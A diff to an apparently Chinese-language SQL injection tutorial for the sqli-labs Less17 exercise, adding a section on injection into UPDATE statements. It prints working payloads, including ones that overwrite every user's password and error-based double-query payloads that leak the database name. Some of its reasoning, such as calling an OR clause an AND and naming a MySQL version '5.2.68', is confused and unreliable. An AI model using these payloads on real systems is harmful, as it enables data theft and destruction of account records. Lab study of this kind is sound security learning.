@@ -735,9 +735,78 @@ Double query injection
 
 那么可以利用or来连接。
 
-' or (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x)
+' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x)
 
 <img src="/images/sql_19.png" alt="">
+
+<h4>SQLi in Update query</h4>
+
+在数据库的操作中，最常用的是查询语句，但偶尔还是会用上Update语句的。
+
+同样在Update语句中依然存在注入。
+
+在Less17中，就是一个Update的例子。
+
+先看看sql的update语句。
+
+update table_name set Column1='' where Column2='xx';
+
+上面的更新语句是指在table_name中
+
+更新column2字段为xx的对应记录中的Column1中的值。
+
+在这个less中，对应的update语句为：
+
+例如将admin的密码设为123
+
+update users set Password='123' where username='admin';
+
+那么这就修改了Password字段。
+
+在输入时，我们就可以输入注入数据。
+
+在username填入admin,password字段填入 ‘ # 这样最后的语句会为：
+
+update users set Password='' # where username='admin'
+
+这样就会把整个users表中的Password的字段内容修改为空。
+
+<img src="/images/sql_20.png" alt="">
+
+那这样的注入功能会不会很鸡肋。
+
+在这种情况下，貌似还只能利用double query injection
+
+去进行注入。原因是:
+
+如果你构造成bool based blind injeciton：
+
+UPDATE users SET password = '' or (select length(database()))=8 #' WHERE username='admin'
+
+也就是提交 admin ，’ or (select length(database()))=8 #,这样的话，mysql的逻辑会去判断password后面的两个内容相当于是(expr1) and (expr2),其中的expr1为‘’，expr2为(select length(database()))=8，这种情况下，expr1为false，expr2为true，and之后为false。
+
+这样mysql就会被理解成password=0。后面加上#当作注释，也就是把users整张表的password字段内容设为了0。
+
+
+所以就只能利用double query injection，让mysql通过报错来回显数据。
+
+构造的注入如下：
+
+UPDATE users SET password = '' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
+
+这里的连接词还不能用and，可能是这个mysql版本有关，当前的环境是5.2.68环境。
+
+我猜测可能是在判断bool的时候，如果前面的值为false并且用and链接的话，mysql就不会继续去解析后面的语句。
+
+所以如果写成这样：
+
+UPDATE users SET password = '1' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'
+
+那么这个语句就能正常的显示：
+
+<img src="/images/sql_21.png" alt="">
+
+
 
 <code>...待续</code>
 
